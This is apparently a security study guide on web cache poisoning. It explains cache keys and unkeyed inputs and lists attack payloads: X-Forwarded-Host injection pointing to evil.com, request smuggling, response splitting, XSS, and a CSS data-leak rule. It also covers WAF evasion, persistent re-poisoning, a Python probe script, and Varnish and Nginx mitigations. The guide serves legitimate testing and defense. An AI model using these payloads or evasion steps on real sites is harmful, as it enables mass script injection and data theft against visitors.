## Web Cache Poisoning

- **What web cache poisoning is**
  - An attack technique where a malicious HTTP response is cached and served to other users
  - Exploits the behavior of web servers and caches to deliver harmful payloads
  - Two-phase attack: (1) elicit a harmful response from the back-end server, (2) ensure it gets cached
  - Allows attackers to distribute attacks like XSS, JavaScript injection, open redirects at scale
  - Turns normally client-side vulnerabilities into stored, server-distributed attacks
  - First popularized in PortSwigger's 2018 research "Practical Web Cache Poisoning"
  - Extended in 2020 research "Web Cache Entanglement: Novel Pathways to Poisoning"

- **How web caches work**
  
  - **Cache operation basics**
    - Caches sit between users and web servers
    - Store copies of responses to specific requests
    - Serve cached responses to subsequent equivalent requests
    - Reduce server load and improve performance
    - Typically deployed at the edge (CDNs) or on the back-end servers
  
  - **Cache keys**
    - Subset of request components used to determine if a cached response can be served
    - Typically include request line (URL, path, query string) and Host header
    - May include other headers (e.g., Accept, Accept-Encoding, Cookie)
    - Request components not in the cache key are "unkeyed" inputs
    - Unkeyed inputs are ignored when determining whether to serve a cached response
  
  - **Cache behavior**
    - Cache compares incoming request's cache key with stored entries
    - If match found, cached response is served without hitting back-end
    - If no match, request is forwarded to the server and response may be cached
    - Cache entries expire after a defined period (TTL - Time To Live)
    - Different resources may have different caching policies (public, private, no-cache)
    - Caching headers (Cache-Control, Expires, ETag) control caching behavior

- **Impact of web cache poisoning**
  
  - **Attack distribution factors**
    - Traffic volume to the affected page (high-traffic pages = greater impact)
    - Cache duration (TTL) of the poisoned response
    - Number of caches affected (CDN edges, local caches)
    - Uniqueness of the cache key (more specific = less impact)
  
  - **Potential impacts**
    - Execute JavaScript in victims' browsers via cached XSS
    - Steal sensitive data through injected scripts
    - Redirect users to malicious sites
    - Deface content on high-profile pages
    - Distribute malware through poisoned resource inclusions
    - Chain with other vulnerabilities for greater impact
    - Achieve persistent effects without attacker interaction
  
  - **Real-world impact examples**
    - Home page poisoning affecting thousands of visitors
    - Cached JavaScript libraries affecting multiple sites
    - Login page poisoning leading to credential theft
    - API cache poisoning affecting mobile applications

- **Constructing a web cache poisoning attack**
  
  - **Step 1: Identify and evaluate unkeyed inputs**
    
    - **Manual testing techniques**
      - Add random headers and observe response differences
      - Test variations of the same header (e.g., X-Forwarded-Host, X-Host, Host)
      - Check for reflected input in responses
      - Analyze subtle differences in responses (script URLs, metadata)
      - Look for unusual or custom headers that might be processed
    
    - **Automated testing with Param Miner**
      - Use Burp Suite's Param Miner extension
      - "Guess headers" feature to discover unkeyed inputs
      - Automatically add cache busters to prevent accidental poisoning
      - Analyze detected headers and their influence on responses
      - Example usage:
        ```
        1. Right-click on a request in Burp
        2. Select "Extensions" > "Param Miner" > "Guess headers"
        3. Review findings in the "Issues" or "Output" tab
        ```
    
    - **Common unkeyed inputs to test**
      - X-Forwarded-Host, X-Host, X-Forwarded-Server
      - X-Original-URL, X-Rewrite-URL, X-Override-URL
      - X-Forwarded-For, X-Remote-IP, X-Client-IP
      - User-Agent, Referer, Accept-Language
      - Custom headers specific to frameworks/CDNs
      - Cookies not included in cache key
  
  - **Step 2: Elicit harmful responses through unkeyed inputs**
    
    - **Understanding input processing**
      - Analyze how the application uses the unkeyed input
      - Identify reflection points in HTML, JavaScript, or HTTP headers
      - Determine if inputs influence resource loading or URL generation
      - Test if inputs affect server behavior or application logic
    
    - **Common processing flaws to exploit**
      - Reflected values in HTML content
      - Header values used in dynamically generated URLs
      - Server-side includes based on header values
      - Language/content negotiation based on headers
      - Geolocation features influenced by IP-related headers
      - User-Agent responsive behavior or analytics
    
    - **Payload construction**
      - Target reflection points with appropriate payloads
      - Craft context-specific exploits (HTML, JS, header)
      - Chain multiple unkeyed inputs for complex attacks
      - Use payloads that survive any server-side processing
  
  - **Step 3: Get the response cached**
    
    - **Understanding cache behavior**
      - Determine which responses get cached
      - Identify cache indicators in responses
      - Look for cache headers (Age, X-Cache, Cache-Control)
      - Analyze cache hit/miss patterns
    
    - **Cache detection techniques**
      - Send identical requests and observe response times
      - Look for cache status headers (X-Cache: HIT/MISS)
      - Check Age header incrementing between requests
      - Use unique values and check for reflection in subsequent requests
    
    - **Ensuring cacheability**
      - Target cacheable resources (static content, public pages)
      - Use HTTP methods likely to be cached (GET, HEAD)
      - Avoid cache-busting headers (Cache-Control: no-store)
      - Target URL patterns that match cache rules
      - May need to manipulate URL or headers to trigger caching
    
    - **Testing cache persistence**
      - Confirm payload remains in cache after multiple requests
      - Calculate cache TTL by monitoring Age header
      - Plan attack timing around cache expiration

- **Exploiting cache design flaws**
  
  - **Unkeyed header attacks**
    
    - **Host header attacks**
      - Manipulate X-Forwarded-Host to control resource inclusion
      - Example payload:
        ```http
        GET / HTTP/1.1
        Host: example.com
        X-Forwarded-Host: evil.com
        ```
      - Target response with dynamically generated URLs
      - Look for script sources, CSS imports, JSON endpoints using hostname
      - Poison cache with references to attacker-controlled domains
    
    - **URL-based attacks**
      - X-Original-URL and X-Rewrite-URL to control routing
      - Example payload:
        ```http
        GET / HTTP/1.1
        Host: example.com
        X-Original-URL: /admin
        ```
      - Path confusion leading to incorrect access control
      - Security-sensitive routes served to unauthorized users
      - Cache poisoning to expose admin functionality
    
    - **Language and content-type attacks**
      - Accept-Language to control response content
      - Content-Type negotiation to change response format
      - Example payload:
        ```http
        GET / HTTP/1.1
        Host: example.com
        Accept-Language: en"><script>alert(1)</script>
        ```
      - Target internationalization features
      - Poison multiple language variants of the same page
  
  - **Protocol-level cache poisoning**
    
    - **HTTP/2 desync attacks**
      - Exploit inconsistencies between HTTP/2 and HTTP/1.1 parsing
      - Front-end cache speaks HTTP/2, back-end uses HTTP/1.1
      - Example: Manipulate pseudo-headers in HTTP/2 requests
      - Force cache to store responses for manipulated requests
    
    - **HTTP request smuggling**
      - Use CL.TE or TE.CL techniques to poison cache
      - Prefix cache with attacker-controlled response
      - Example payload:
        ```http
        POST / HTTP/1.1
        Host: example.com
        Content-Length: 128
        Transfer-Encoding: chunked

        0

        GET /home HTTP/1.1
        Host: example.com
        X-Forwarded-Host: evil.com

        ```
      - Combine with cache poisoning for wider impact
      - Exploit request/response queue poisoning
  
  - **Cache key manipulation**
    
    - **Parameter cloaking**
      - Exploit differences in parameter parsing
      - Example payload:
        ```
        GET /?param=innocent&param=malicious HTTP/1.1
        ```
      - Different handling between cache and application
      - Cache might use first occurrence, application uses last
    
    - **Path confusion attacks**
      - Normalize paths differently between cache and server
      - Example payloads:
        ```
        GET /home/./admin HTTP/1.1
        GET /home//admin HTTP/1.1
        GET /home/%2fadmin HTTP/1.1
        ```
      - Cache may normalize paths before keying
      - Server might use original or differently normalized path

- **Exploiting cache implementation flaws**
  
  - **Cache key oversights**
    
    - **Unkeyed query parameters**
      - Identify parameters excluded from cache key
      - Example payload:
        ```
        GET /page?keyed=123&unkeyed=<script>alert(1)</script> HTTP/1.1
        ```
      - Exploit parameter prioritization in application
      - Poison cache with malicious content via unkeyed parameters
    
    - **Cache key injection**
      - Insert unexpected characters into URL/parameters
      - Example payloads:
        ```
        GET /page?keyed=123%0d%0aX-Header:%20malicious HTTP/1.1
        ```
      - Exploit cache key truncation or parsing errors
      - Force cache to store poisoned responses with manipulated keys
    
    - **Untrusted data in cache keys**
      - Target custom cache key definitions
      - Exploit normalized or transformed cache keys
      - Example: Cached responses varying on user-controlled headers
      - Manipulate cache segmentation logic
  
  - **Web cache poisoning with multiple headers**
    
    - **Duplicate header attacks**
      - Send multiple instances of the same header
      - Example payload:
        ```http
        GET / HTTP/1.1
        Host: example.com
        X-Forwarded-Host: innocent.com
        X-Forwarded-Host: evil.com
        ```
      - Exploit inconsistent handling between cache and server
      - Cache might use first header, server might use last (or vice versa)
    
    - **Header order manipulation**
      - Vary order of headers to influence processing
      - Cache may not consider header order in cache key
      - Server might process headers in order-dependent way
      - Example: Content-Type before Accept influencing response
    
    - **Combined header techniques**
      - Use multiple headers for complex attacks
      - Example payload:
        ```http
        GET / HTTP/1.1
        Host: example.com
        X-Forwarded-Host: evil.com
        X-Forwarded-Scheme: https
        ```
      - Leverage interdependent header processing
      - Target application logic requiring multiple conditions
  
  - **Response-splitting techniques**
    
    - **HTTP response splitting**
      - Inject newlines to create synthetic HTTP responses
      - Example payload:
        ```http
        GET /?param=123%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
        ```
      - Cache stores malformed responses with injected content
      - Leverage HTTP parsing inconsistencies
    
    - **Response header injection**
      - Inject values into response headers via unkeyed inputs
      - Example payload:
        ```http
        GET / HTTP/1.1
        Host: example.com
        X-Forwarded-Host: evil.com%0d%0aSet-Cookie:%20session=hacked
        ```
      - Target header reflection in responses
      - Poison cache with malicious headers (Set-Cookie, Location)

- **Advanced web cache poisoning techniques**
  
  - **Cache probing techniques**
    
    - **Cache busting**
      - Add unique parameter to avoid accidental poisoning
      - Example:
        ```
        GET /page?cb=123456 HTTP/1.1
        ```
      - Create distinct requests during testing
      - Ensure test requests don't affect other users
    
    - **TTL discovery**
      - Determine cache expiration times
      - Monitor Age header across multiple requests
      - Calculate optimal timing for attack execution
      - Plan poisoning to maximize exposure
    
    - **Cache implementation fingerprinting**
      - Identify specific cache technology (Varnish, Cloudflare, Akamai)
      - Test cache-specific headers and behaviors
      - Tailor exploits to known implementation quirks
      - Example: Look for X-Varnish, CF-Cache-Status, X-Cache headers
  
  - **Web cache poisoning via resource import**
    
    - **Poisoning JavaScript includes**
      - Target dynamically generated script URLs
      - Example payload:
        ```http
        GET / HTTP/1.1
        Host: example.com
        X-Forwarded-Host: evil.com
        ```
      - Response contains: `<script src="https://evil.com/analytics.js"></script>`
      - Serve malicious JavaScript from attacker domain
      - Compromise all visitors while poisoned response is cached
    
    - **Poisoning stylesheets**
      - Target dynamically generated CSS URLs
      - Use CSS to extract sensitive information
      - Example CSS attack:
        ```css
        input[value^="a"] { background-image: url(https://evil.com/a); }
        ```
      - Leak data through side-channel attacks
      - Exploit CSS selector behavior for information gathering
    
    - **Font and media import attacks**
      - Target dynamically generated font URLs
      - Example payload for font import:
        ```http
        GET / HTTP/1.1
        Host: example.com
        X-Forwarded-Host: evil.com
        ```
      - Response contains: `@font-face { src: url(https://evil.com/font.woff); }`
      - Deliver malicious resources through trusted domain
  
  - **DOM-based cache poisoning**
    
    - **Client-side template injection**
      - Target client-side templating in cached responses
      - Example payload:
        ```http
        GET /?template=${alert(1)} HTTP/1.1
        ```
      - Exploit client-side template engines (Handlebars, Angular)
      - Poison cache with template injection payloads
    
    - **DOM XSS via cache poisoning**
      - Target client-side JavaScript in cached responses
      - Example payload for innerHTML vulnerability:
        ```http
        GET /?param=<img src=x onerror=alert(1)> HTTP/1.1
        ```
      - Combine with unkeyed inputs for cache persistence
      - Exploit DOM-based vulnerabilities at scale
    
    - **Client-side prototype pollution**
      - Poison cache with JSON responses containing prototype pollution
      - Example payload:
        ```http
        GET /api/config HTTP/1.1
        X-Json-Override: {"__proto__":{"isAdmin":true}}
        ```
      - Exploit client-side object merging
      - Poison application state for all users
  
  - **Web cache poisoning without unkeyed inputs**
    
    - **Cache key flaws**
      - Target incorrectly constructed cache keys
      - Example: Cache ignoring parts of URL (fragments, specific parameters)
      - Find parameters excluded from cache key but included in response
      - Exploit normalization differences (upper/lowercase, encoded chars)
    
    - **Normalized cache poisoning**
      - Exploit URL normalization differences
      - Example payloads:
        ```
        GET /home/./admin HTTP/1.1
        GET /home/%2e/admin HTTP/1.1
        ```
      - Cache might use normalized URL as key
      - Application processes original URL
      - Poison cache with privileged content
    
    - **Cache poisoning via request collision**
      - Force different requests to generate same cache key
      - Example: Exploit hash collisions in cache key generation
      - Target cache key truncation (long URLs, specific patterns)
      - Poison cache entry shared by multiple distinct resources

- **Web cache poisoning evasion techniques**
  
  - **Bypassing WAF and security controls**
    
    - **Payload obfuscation**
      - Encode and obfuscate attack payloads
      - Example encoding methods:
        - URL encoding: `%3Cscript%3Ealert(1)%3C%2Fscript%3E`
        - Double encoding: `%253Cscript%253Ealert(1)%253C%252Fscript%253E`
        - HTML entity encoding: `&lt;script&gt;alert(1)&lt;/script&gt;`
      - Bypass pattern-matching security controls
      - Target inconsistent decoding between systems
    
    - **Header smuggling**
      - Use non-standard header variations
      - Example techniques:
        - Add whitespace: `X-Forwarded-Host : evil.com`
        - Use uncommon casing: `x-ForwardED-HosT: evil.com`
        - Add duplicate headers with variations
      - Exploit inconsistent header parsing
      - Bypass security controls looking for specific headers
    
    - **Multi-step poisoning**
      - Break attack into multiple innocuous requests
      - Chain unkeyed inputs for complex attacks
      - Distribute payload across multiple headers
      - Evade payload detection through fragmentation
  
  - **Evading cache defense mechanisms**
    
    - **TTL evasion techniques**
      - Time attacks around cache refreshes
      - Persistently re-poison cache after expiration
      - Use automated tools to maintain poisoned state
      - Script continuous poisoning to overcome short TTLs
    
    - **Vary header manipulation**
      - Exploit Vary header handling
      - Target specific cache variations
      - Example: Poison specifically mobile or desktop views
      - Target language-specific cached versions
    
    - **Targeted cache segment poisoning**
      - Target specific cache keys to minimize detection
      - Focus on low-traffic but sensitive resources
      - Poison error pages or infrequently monitored routes
      - Use timing techniques to identify optimal targets
  
  - **Cache purging techniques**
    
    - **Force cache reset**
      - Trigger cache purges to apply new poisoned responses
      - Example methods:
        - Request uncacheable variant with Cache-Control
        - Manipulate request to force cache miss
        - Flood cache with unique requests to evict entries
      - Clear poisoned response if detected
      - Create cleaner attack chains
    
    - **Cache Buster Chaining**
      - First request: set up attack conditions
      - Second request: exploit condition with cache poisoning
      - Example two-step attack:
        ```
        1. GET /page?cb=1&setup=malicious HTTP/1.1 (sets up attack)
        2. GET /page?param=payload HTTP/1.1 (exploits condition and poisons cache)
        ```
      - Evade detection by separating setup from exploitation

- **Testing for web cache poisoning**
  
  - **Methodology**
    
    - **Identify caching behavior**
      - Send duplicate requests to detect caching
      - Look for cache headers (Age, X-Cache)
      - Test different resources for cacheability
      - Analyze cache key construction
    
    - **Map the attack surface**
      - Identify unkeyed inputs
      - Test header processing
      - Analyze URL handling and normalization
      - Inspect client-side code for dynamic resource loading
    
    - **Craft poisoned responses**
      - Develop innocuous proof-of-concept payloads
      - Test payload delivery and persistence
      - Validate cache poisoning with multiple clients
      - Develop exploit chain if successful
    
    - **Reporting findings safely**
      - Clear poisoned cache after testing
      - Document impact without affecting users
      - Provide clear remediation advice
      - Demonstrate exploit with cache busters
  
  - **Tools and automation**
    
    - **Burp Suite testing**
      - Use Param Miner extension for unkeyed input discovery
      - Employ Burp Intruder for payload testing
      - Utilize Match and Replace for header manipulation
      - Example workflow:
        ```
        1. Discover unkeyed inputs with Param Miner
        2. Test reflection with Burp Repeater
        3. Confirm caching with duplicate requests
        4. Test poisoning with cache busters
        ```
    
    - **Custom scripts and tools**
      - Python scripts for automated cache probing
      - Tools to maintain persistent poisoning
      - Cache key testing frameworks
      - Example Python cache testing script:
        ```python
        import requests
        import time

        def test_cache_poisoning(url, header_name, payload):
            # Add cache buster to avoid affecting real users
            cache_buster = str(time.time())
            test_url = f"{url}?cb={cache_buster}"
            
            # Send poisoned request
            headers = {header_name: payload}
            response = requests.get(test_url, headers=headers)
            
            # Check if payload is reflected
            if payload in response.text:
                print(f"Payload reflected in response")
                
                # Verify caching by sending clean request
                clean_response = requests.get(test_url)
                if payload in clean_response.text:
                    print(f"VULNERABLE: Cache successfully poisoned!")
                    return True
            
            return False
        
        # Example usage
        test_cache_poisoning(
            "https://example.com",
            "X-Forwarded-Host",
            "evil.com"
        )
        ```

- **Prevention and mitigation**
  
  - **Cache configuration best practices**
    
    - **Proper cache key definition**
      - Include all input that influences response in cache key
      - Example Varnish configuration:
        ```vcl
        sub vcl_hash {
            hash_data(req.url);
            hash_data(req.http.host);
            hash_data(req.http.X-Forwarded-Host);
            hash_data(req.http.Accept-Language);
            return (lookup);
        }
        ```
      - Carefully evaluate what should and shouldn't be keyed
      - When in doubt, include more components in cache key
    
    - **Input validation and sanitization**
      - Validate and sanitize all inputs, even if not in cache key
      - Implement strict header validation
      - Normalize inputs to avoid inconsistencies
      - Example header validation (Node.js):
        ```javascript
        // Validate Host header against whitelist
        const validHosts = ['example.com', 'www.example.com'];
        if (!validHosts.includes(req.headers.host)) {
            return res.status(400).send('Invalid Host header');
        }
        ```
    
    - **Security headers**
      - Implement Content-Security-Policy to mitigate XSS
      - Use Strict-Transport-Security to enforce HTTPS
      - Add X-Content-Type-Options: nosniff
      - Consider implementing Subresource Integrity for scripts
      - Example security headers:
        ```http
        Content-Security-Policy: default-src 'self'; script-src 'self'
        Strict-Transport-Security: max-age=31536000; includeSubDomains
        X-Content-Type-Options: nosniff
        X-Frame-Options: DENY
        ```
  
  - **Architectural considerations**
    
    - **Cache layer security**
      - Implement request normalization before caching
      - Consider caching only at application level, not CDN
      - Strip or validate unkeyed headers before processing
      - Implement consistent cache key generation logic
    
    - **Selective caching**
      - Only cache static content when possible
      - Avoid caching personalized or security-critical pages
      - Implement separate caching rules for different content types
      - Example Nginx configuration for selective caching:
        ```nginx
        # Cache static resources
        location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
            expires 7d;
            add_header Cache-Control "public";
        }
        
        # Don't cache sensitive areas
        location /admin/ {
            add_header Cache-Control "no-store, no-cache";
        }
        ```
    
    - **Cache poisoning detection**
      - Monitor for unusual cache patterns or requests
      - Implement logging for suspicious header combinations
      - Consider deploying cache behavior anomaly detection
      - Regularly audit cached content for unexpected values
